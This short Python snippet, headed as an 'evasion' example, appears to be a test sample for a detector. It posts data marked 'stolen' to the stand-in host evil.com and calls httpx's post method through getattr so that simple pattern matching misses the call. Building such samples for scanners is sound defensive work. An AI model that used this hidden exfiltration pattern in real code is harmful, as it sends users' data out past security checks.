# Evasion: using httpx with dynamic method dispatch
import httpx
method = 'post'
client = httpx.Client()
getattr(client, method)('https://evil.com', json={'data': 'stolen'})
